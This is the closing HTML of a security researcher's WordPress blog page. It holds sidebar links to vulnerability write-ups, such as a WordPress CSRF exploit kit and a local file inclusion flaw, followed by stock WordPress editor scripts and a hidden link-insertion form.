				<a href="https://charlieeriksen.github.io/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
						</li>
				</ul>
		</aside>		</div><!-- #secondary .widget-area -->
	
	</div><!-- #main -->
	
	
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
					
		</div>
	</footer><!-- #colophon -->
	
		
</div><!-- #page -->

<link rel='stylesheet' id='wp-jquery-ui-dialog-css'  href='https://charlieeriksen.github.io/wp-includes/css/jquery-ui-dialog.min.css?ver=3.8.3' type='text/css' media='all' />
<script type='text/javascript'>
/* <![CDATA[ */
var wordCountL10n = {"type":"w"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-admin/js/word-count.min.js?ver=3.8.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.core.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.widget.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.mouse.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.resizable.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.draggable.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.button.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.position.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.dialog.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/tinymce/plugins/wpdialogs/js/wpdialog.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpLinkL10n = {"title":"Insert\/edit link","update":"Update","save":"Add Link","noTitle":"(no title)","noMatchesFound":"No matches found."};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/wplink.min.js?ver=3.8.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/tinymce/plugins/wpdialogs/js/popup.min.js?ver=3.8.3'></script>

	<script type="text/javascript">
		tinyMCEPreInit = {
			base : "",
			suffix : "",
			query : "ver=359-20131026",
			mceInit : {},
			qtInit : {'comment':{id:"comment",buttons:"strong,em,link,block,del,ins,img,ul,ol,li,code,more,close"}},
			ref : {plugins:"",theme:"advanced",language:""},
			load_ext : function(url,lang){var sl=tinymce.ScriptLoader;sl.markDone(url+'/langs/'+lang+'.js');sl.markDone(url+'/langs/'+lang+'_dlg.js');}
		};
	</script>

	<script type="text/javascript">
		var wpActiveEditor;

		(function(){
			var init, ed, qt, first_init, DOM, el, i, mce = 0;

			if ( typeof(tinymce) == 'object' ) {
				DOM = tinymce.DOM;
				// mark wp_theme/ui.css as loaded
				DOM.files[tinymce.baseURI.getURI() + '/themes/advanced/skins/wp_theme/ui.css'] = true;

				DOM.events.add( DOM.select('.wp-editor-wrap'), 'mousedown', function(e){
					if ( this.id )
						wpActiveEditor = this.id.slice(3, -5);
				});

				for ( ed in tinyMCEPreInit.mceInit ) {
					if ( first_init ) {
						init = tinyMCEPreInit.mceInit[ed] = tinymce.extend( {}, first_init, tinyMCEPreInit.mceInit[ed] );
					} else {
						init = first_init = tinyMCEPreInit.mceInit[ed];
					}

					if ( mce )
						try { tinymce.init(init); } catch(e){}
				}
			} else {
				if ( tinyMCEPreInit.qtInit ) {
					for ( i in tinyMCEPreInit.qtInit ) {
						el = tinyMCEPreInit.qtInit[i].id;
						if ( el )
							document.getElementById('wp-'+el+'-wrap').onmousedown = function(){ wpActiveEditor = this.id.slice(3, -5); }
					}
				}
			}

			if ( typeof(QTags) == 'function' ) {
				for ( qt in tinyMCEPreInit.qtInit ) {
					try { quicktags( tinyMCEPreInit.qtInit[qt] ); } catch(e){}
				}
			}
		})();
		var ajaxurl = "/wp-admin/admin-ajax.php";		</script>
			<div style="display:none;">
	<form id="wp-link" tabindex="-1">
	<input type="hidden" id="_ajax_linking_nonce" name="_ajax_linking_nonce" value="a25a108328" />	<div id="link-selector">
		<div id="link-options">
			<p class="howto">Enter the destination URL</p>
			<div>
				<label><span>URL</span><input id="url-field" type="text" name="href" /></label>
			</div>
			<div>
				<label><span>Title</span><input id="link-title-field" type="text" name="linktitle" /></label>
			</div>
			<div class="link-target">
				<label><input type="checkbox" id="link-target-checkbox" /> Open link in a new window/tab</label>
			</div>
		</div>
				<p class="howto toggle-arrow " id="internal-toggle">Or link to existing content</p>
		<div id="search-panel" style="display:none">
			<div class="link-search-wrapper">
				<label>
					<span class="search-label">Search</span>
					<input type="search" id="search-field" class="link-search-field" autocomplete="off" />
					<span class="spinner"></span>
				</label>
			</div>
			<div id="search-results" class="query-results">
				<ul></ul>
				<div class="river-waiting">
					<span class="spinner"></span>
				</div>
			</div>
			<div id="most-recent-results" class="query-results">
				<div class="query-notice"><em>No search term specified. Showing recent items.</em></div>
				<ul></ul>
				<div class="river-waiting">
					<span class="spinner"></span>
				</div>
			</div>
		</div>
	</div>
	<div class="submitbox">
		<div id="wp-link-update">
			<input type="submit" value="Add Link" class="button-primary" id="wp-link-submit" name="wp-link-submit">
		</div>
		<div id="wp-link-cancel">
			<a class="submitdelete deletion" href="#">Cancel</a>
		</div>
	</div>
	</form>
	</div>
	
</body>
</html>
<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: ceriksen.com @ 2014-07-18 20:45:40 by W3 Total Cache -->